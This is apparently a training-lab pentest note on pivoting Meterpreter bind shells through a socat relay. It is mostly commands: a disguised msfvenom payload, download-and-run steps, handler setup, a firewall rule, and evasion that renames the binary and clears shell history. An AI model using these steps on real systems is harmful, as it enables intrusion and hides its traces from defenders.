# Socat Redirection with Bind Shell

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[Socat Redirection with a Reverse Shell|Socat Reverse Shell]], [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter Port Forward]]

---

## Overview

Socat can redirect bind shell connections from internal targets through a pivot host. This allows you to connect to bind shells that are only accessible from the internal network.

**Use Cases:**
- Accessing bind shells on internal targets
- No direct network route to target
- Simple port redirection needed
- Alternative to SSH port forwarding

**Advantages:**
- Simple setup
- Fast performance
- No authentication required
- Works with any bind shell

**Bind Shell vs Reverse Shell:**
- **Bind Shell**: Target listens, attacker connects TO target
- **Reverse Shell**: Attacker listens, target connects TO attacker
- See: [[Socat Redirection with a Reverse Shell|Reverse Shell Method]]

---

## Network Topology

```
Attack Machine → Pivot Host (Socat) → Internal Target (Bind Shell)
(10.10.14.18)    (10.129.202.64:8080)  (172.16.5.19:8443)
   Connects          Redirects              Listening
```

### Environment Details

| Component | IP/Port | Description |
|-----------|---------|-------------|
| Attack Machine | 10.10.14.18 | Runs Metasploit bind handler |
| Pivot Host | 10.129.202.64:8080 | Ubuntu running socat redirector |
| Internal Target | 172.16.5.19:8443 | Windows with bind shell listening |

---

## Step-by-Step Setup

### Step 1: Create Bind Shell Payload

```bash
# Windows bind shell
msfvenom -p windows/x64/meterpreter/bind_tcp \
  -f exe \
  -o backupjob.exe \
  LPORT=8443
```

**Key Point:** 
- No LHOST needed for bind shells
- Payload listens on port 8443
- Target becomes the server

**For Linux Target:**
```bash
msfvenom -p linux/x64/shell/bind_tcp \
  -f elf \
  -o shell \
  LPORT=8443
```

---

### Step 2: Deploy Payload to Internal Target

#### Transfer Through Pivot
```bash
# On pivot host, setup web server
python3 -m http.server 8000

# On internal target (Windows)
Invoke-WebRequest -Uri "http://172.16.5.129:8000/backupjob.exe" -OutFile "C:\backupjob.exe"

# Execute payload
C:\backupjob.exe
```

**Result:** Target now listening on port 8443

---

### Step 3: Setup Socat Redirector on Pivot

```bash
# On pivot host (10.129.202.64)
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Explanation:**
- `TCP4-LISTEN:8080`: Listen on pivot port 8080 (external interface)
- `fork`: Handle multiple connections
- `TCP4:172.16.5.19:8443`: Forward to internal target bind shell

**What This Does:**
```
Attacker connects to: pivot:8080
Socat forwards to: internal_target:8443
```

---

### Step 4: Configure Metasploit Handler

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

**Critical Settings:**
- **RHOST**: Pivot host IP (NOT target IP!)
- **LPORT**: Socat listening port (NOT bind shell port!)
- Handler connects TO pivot, pivot forwards to target

---

### Step 5: Establish Connection

```bash
[*] Started bind TCP handler against 10.129.202.64:8080
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: INLANEFREIGHT\victor

meterpreter > sysinfo
Computer        : WIN-TARGET
OS              : Windows 10
Architecture    : x64
```

---

## Traffic Flow Diagram

```
1. Attacker initiates connection
   [Metasploit] → TCP:8080 → [Pivot:8080]

2. Socat receives and forwards
   [Pivot:8080] → TCP:8443 → [Target:8443]

3. Bind shell responds
   [Target:8443] → [Pivot:8080] → [Attacker]

4. Two-way communication established
   Attacker ←→ Pivot ←→ Target
```

---

## Multiple Bind Shells Through Pivot

### Scenario: Multiple Internal Targets

```bash
# On pivot, setup multiple redirectors

# Target 1 (172.16.5.19)
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &

# Target 2 (172.16.5.20)
socat TCP4-LISTEN:8081,fork TCP4:172.16.5.20:8443 &

# Target 3 (172.16.5.21)
socat TCP4-LISTEN:8082,fork TCP4:172.16.5.21:8443 &
```

### Connect to Each Target

```bash
# Terminal 1 - Target 1
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run

# Terminal 2 - Target 2
set LPORT 8081
run

# Terminal 3 - Target 3
set LPORT 8082
run
```

---

## Advanced Socat Usage

### Verbose Logging
```bash
# See all connection details
socat -d -d TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Output:**
```
2024/01/15 10:30:45 socat[1234] N listening on AF=2 0.0.0.0:8080
2024/01/15 10:31:02 socat[1235] N accepting connection
2024/01/15 10:31:02 socat[1235] N opening connection to 172.16.5.19:8443
2024/01/15 10:31:02 socat[1235] N successfully connected
```

### Bind to Specific Interface
```bash
# Only listen on specific IP
socat TCP4-LISTEN:8080,bind=10.129.202.64,fork TCP4:172.16.5.19:8443
```

### Connection Timeout
```bash
# 30 second connection timeout
socat TCP4-LISTEN:8080,fork,connect-timeout=30 TCP4:172.16.5.19:8443
```

### Range-based Redirection
```bash
# Forward range of ports
for i in {8080..8090}; do
  target_port=$((8443 + i - 8080))
  socat TCP4-LISTEN:$i,fork TCP4:172.16.5.19:$target_port &
done
```

---

## Comparison: Bind Shell Access Methods

| Method | Speed | Setup | Stealth | Requirements |
|--------|-------|-------|---------|--------------|
| Socat | Fast | Easy | Medium | Shell access to pivot |
| [[SSH Socks Tunnel PF\|SSH Local Forward]] | Fast | Easy | High | SSH to pivot |
| [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding\|Meterpreter portfwd]] | Medium | Medium | Low | Meterpreter on pivot |
| [[SOCKS5 Tunneling with Chisel\|Chisel Forward]] | Medium | Easy | Medium | HTTP egress |

**Use Socat When:**
- Simple bind shell redirection needed
- No SSH available
- Want minimal overhead
- Quick and dirty access required

**Use Alternatives When:**
- [[SSH Socks Tunnel PF|SSH]]: Have SSH access, want encryption
- [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter]]: Already have Meterpreter session
- [[SOCKS5 Tunneling with Chisel|Chisel]]: Need full SOCKS proxy, not just single port

---

## Bind Shell vs Reverse Shell with Socat

### Bind Shell (This Technique)
```
Target: Listens on port (server)
Attacker: Connects to target (client)
Socat: Forwards attacker → target

Use when: Target can bind ports
Command: socat TCP4-LISTEN:8080,fork TCP4:target:8443
```

### Reverse Shell ([[Socat Redirection with a Reverse Shell|See Full Guide]])
```
Attacker: Listens on port (server)
Target: Connects to attacker (client)
Socat: Forwards target → attacker

Use when: Target firewalls block inbound
Command: socat TCP4-LISTEN:8080,fork TCP4:attacker:80
```

---

## Troubleshooting

### Cannot Connect to Bind Shell

**Check if bind shell is listening on target:**
```bash
# On target or through existing access
netstat -an | grep 8443
# Should show: LISTENING on port 8443
```

**Check if socat is running on pivot:**
```bash
# On pivot
ps aux | grep socat
netstat -tulpn | grep 8080
```

**Test socat redirect manually:**
```bash
# On attack machine
nc -zv 10.129.202.64 8080

# Should connect successfully
```

### Firewall Blocking Connection

**Check pivot firewall:**
```bash
# On pivot
iptables -L -n | grep 8080
ufw status

# Allow if needed
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
```

**Check target firewall:**
```bash
# On target (Windows)
netsh advfirewall firewall add rule name="Bind Shell" dir=in action=allow protocol=TCP localport=8443
```

### Connection Drops

**Add keepalive:**
```bash
socat TCP4-LISTEN:8080,fork,keepalive,keepidle=10,keepintvl=5,keepcnt=2 TCP4:172.16.5.19:8443
```

**Increase buffer size:**
```bash
socat -T 60 TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

## Alternative Tools

If socat isn't available, use alternatives:

### Using Netcat
```bash
# On pivot (requires mkfifo)
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc 172.16.5.19 8443 > /tmp/pipe
```

### Using SSH
```bash
# Local port forward
ssh -L 8080:172.16.5.19:8443 user@pivot

# Then connect to localhost:8080
```

### Using Python
```python
# Simple port forwarder
import socket, threading

def forward(src, dst):
    while True:
        data = src.recv(4096)
        if not data: break
        dst.sendall(data)

s = socket.socket()
s.bind(('0.0.0.0', 8080))
s.listen(5)

while True:
    client, addr = s.accept()
    target = socket.socket()
    target.connect(('172.16.5.19', 8443))
    
    threading.Thread(target=forward, args=(client, target)).start()
    threading.Thread(target=forward, args=(target, client)).start()
```

---

## Operational Security

### Detection Indicators
- Socat process running on pivot
- Unusual port listening
- Network connections to internal hosts
- Process command line reveals target IP

### Evasion Techniques
```bash
# Rename binary
cp socat /tmp/.update-daemon
/tmp/.update-daemon TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Use common port
socat TCP4-LISTEN:443,fork TCP4:172.16.5.19:8443

# Clean up after
killall socat
rm /tmp/socat
history -c
```

---

## Quick Reference

```bash
# Basic bind shell redirect
socat TCP4-LISTEN:PIVOT_PORT,fork TCP4:TARGET_IP:TARGET_PORT

# Example
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# With logging
socat -d -d TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Specific interface
socat TCP4-LISTEN:8080,bind=IP,fork TCP4:172.16.5.19:8443

# Background process
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &

# Multiple redirects
for i in {8080..8085}; do
  socat TCP4-LISTEN:$i,fork TCP4:172.16.5.$((19+i-8080)):8443 &
done

# Kill all socat
killall socat

# Metasploit handler
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST PIVOT_IP
set LPORT PIVOT_PORT
run
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[Socat Redirection with a Reverse Shell|Socat Reverse Shell Redirection]]
- [[SSH Socks Tunnel PF|SSH Local Port Forwarding]]
- [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter Port Forwarding]]

**Tags:** #socat #bind-shell #port-redirection #pivoting #relay #metasploit